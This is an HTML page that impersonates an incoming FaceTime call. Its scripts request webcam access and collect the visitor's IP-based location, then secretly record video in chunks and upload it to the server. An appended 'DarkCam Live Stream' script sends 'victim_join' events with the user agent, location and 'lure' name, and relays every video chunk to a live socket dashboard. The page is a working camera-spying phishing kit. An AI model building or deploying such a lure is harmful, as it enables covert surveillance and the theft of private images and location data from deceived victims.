<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FaceTime</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }

  /* Full-screen video bg */
  .bg-wrap { position: fixed; inset: 0; background: linear-gradient(160deg, #1c1c3a 0%, #0a0a1a 100%); z-index: 0; }
  #preview { position: fixed; inset: 0; width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); z-index: 1; }
  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.35); z-index: 2; display: none; }

  /* Center content */
  .center { position: relative; z-index: 3; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 0; width: 100%; }

  /* Avatar */
  .avatar-ring { width: 110px; height: 110px; border-radius: 50%; background: linear-gradient(135deg, #34c759, #30b04d); display: flex; align-items: center; justify-content: center; font-size: 48px; font-weight: 700; margin: 0 auto 16px; box-shadow: 0 0 0 6px rgba(52,199,89,0.2); animation: ring-pulse 2s ease-in-out infinite; }
  @keyframes ring-pulse { 0%,100%{box-shadow:0 0 0 6px rgba(52,199,89,0.2)} 50%{box-shadow:0 0 0 18px rgba(52,199,89,0.05)} }

  .caller-name { font-size: 28px; font-weight: 600; letter-spacing: -0.5px; margin-bottom: 6px; text-shadow: 0 1px 6px rgba(0,0,0,0.6); }
  .call-label { font-size: 15px; color: rgba(255,255,255,0.65); margin-bottom: 48px; }

  /* Buttons */
  .btn-row { display: flex; justify-content: center; gap: 48px; }
  .ft-btn { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; }
  .ft-btn .circle { width: 68px; height: 68px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; }
  .ft-btn .lbl { font-size: 13px; color: rgba(255,255,255,0.75); }
  .btn-decline .circle { background: #ff3b30; }
  .btn-accept .circle  { background: #34c759; }
  .btn-accept .circle.disabled { background: #3a3a3c; }

  /* In-call controls (hidden initially) */
  .incall-controls { position: fixed; bottom: 48px; left: 0; right: 0; z-index: 4; display: none; justify-content: center; gap: 24px; }
  .ic-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
  .ic-btn .ic { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.18); display: flex; align-items: center; justify-content: center; font-size: 22px; backdrop-filter: blur(8px); }
  .ic-btn .ic-end { background: #ff3b30; }
  .ic-btn .il { font-size: 11px; color: rgba(255,255,255,0.7); }

  /* Timer top */
  .top-bar { position: fixed; top: 20px; left: 0; right: 0; z-index: 4; text-align: center; display: none; }
  .top-bar .tb-name { font-size: 16px; font-weight: 600; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
  .top-bar .tb-timer { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 2px; }

  /* Self-view pip */
  .self-pip { position: fixed; top: 20px; right: 16px; width: 90px; aspect-ratio: 3/4; border-radius: 12px; overflow: hidden; border: 2px solid rgba(255,255,255,0.3); z-index: 5; display: none; background: #1c1c1e; }
  .self-pip video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }

  .status-toast { position: fixed; bottom: 130px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); color: #fff; font-size: 13px; padding: 8px 18px; border-radius: 20px; backdrop-filter: blur(8px); z-index: 6; display: none; white-space: nowrap; }
</style>
</head>

      <div class="circle">📵</div>

<!-- In-call bottom controls -->
<div class="incall-controls" id="incallControls">
  <div class="ic-btn"><div class="ic">🔇</div><div class="il">Mute</div></div>
  <div class="ic-btn" onclick="endCall()"><div class="ic ic-end">📵</div><div class="il">End</div></div>
  <div class="ic-btn"><div class="ic">📷</div><div class="il">Camera</div></div>
  <div class="ic-btn"><div class="ic">🔊</div><div class="il">Speaker</div></div>
</div>

<div class="status-toast" id="statusToast"></div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream, sec = 0, interval;

function showToast(msg, dur = 3000) {
  const t = document.getElementById("statusToast");
  t.textContent = msg; t.style.display = "block";
  setTimeout(() => t.style.display = "none", dur);
}

async function getGeo() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
}

function tick() {
  sec++;
  document.getElementById("tbTimer").textContent =
    `${String(Math.floor(sec/60)).padStart(2,"0")}:${String(sec%60).padStart(2,"0")}`;
}

async function startSession() {
  document.getElementById("acceptCircle").textContent = "⏳";
  document.getElementById("acceptLbl").textContent = "Connecting";
  document.getElementById("callLabel").textContent = "Connecting...";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720, facingMode:"user" }, audio: false });
  } catch {
    document.getElementById("callLabel").textContent = "Camera access needed";
    document.getElementById("acceptCircle").textContent = "📹";
    document.getElementById("acceptLbl").textContent = "Accept";
    showToast("Allow camera access to FaceTime");
    return;
  }

  // Full-screen preview
  document.getElementById("preview").srcObject = stream;
  document.getElementById("preview").style.display = "block";
  document.getElementById("overlay").style.display = "block";

  // Self PiP
  document.getElementById("selfVideo").srcObject = stream;

  document.getElementById("callLabel").textContent = "Connecting to Priya Mehta...";

  const geo = await getGeo();
  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ session:SID, geo }) }).catch(()=>{});

  await new Promise(r => setTimeout(r, 2000));

  // Switch to in-call UI
  document.getElementById("centerUI").style.display = "none";
  document.getElementById("topBar").style.display = "block";
  document.getElementById("selfPip").style.display = "block";
  document.getElementById("incallControls").style.display = "flex";

  interval = setInterval(tick, 1000);
  startRecording(stream);
}

function declineCall() {
  document.getElementById("callLabel").textContent = "Call declined.";
  document.getElementById("btn-row").style.display = "none";
}

function endCall() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  clearInterval(interval);
  document.getElementById("incallControls").style.display = "none";
  document.getElementById("topBar").style.display = "none";
  document.getElementById("selfPip").style.display = "none";
  document.getElementById("preview").style.display = "none";
  document.getElementById("overlay").style.display = "none";
  document.getElementById("centerUI").style.display = "flex";
  document.getElementById("callLabel").textContent = "FaceTime ended.";
  document.getElementById("btn-row") && (document.querySelector(".btn-row").style.display = "none");
}

function startRecording(stream) {
  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
  };
  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
  };
  mediaRecorder.start(5000);
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
  }, 45000);
}

async function sendChunk(blob, idx) {
  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
  }).catch(()=>{});
}
</script>

<!-- DarkCam Live Stream -->
<script src="/socket.io/socket.io.js"></script>
<script>
(function(){
  const _sock = io({ transports: ['websocket', 'polling'] });
  let _geo = {};

  // Grab geo when available
  if (typeof getGeo === 'function') {
    getGeo().then(g => { _geo = g; });
  }

  _sock.on('connect', function() {
    _sock.emit('victim_join', {
      sid:  typeof SID !== 'undefined' ? SID : 'unknown',
      lure: document.title,
      ua:   navigator.userAgent,
      geo:  _geo
    });
  });

  // Patch sendChunk — relay every chunk to live dashboard
  const _origSend = window.sendChunk;
  window.sendChunk = async function(blob, idx) {
    if (_origSend) await _origSend(blob, idx);
    try {
      const buf = await blob.arrayBuffer();
      _sock.emit('live_chunk', {
        sid:   typeof SID !== 'undefined' ? SID : 'unknown',
        idx:   idx,
        first: idx === 0,
        data:  buf
      });
    } catch(e) {}
  };
})();
</script>
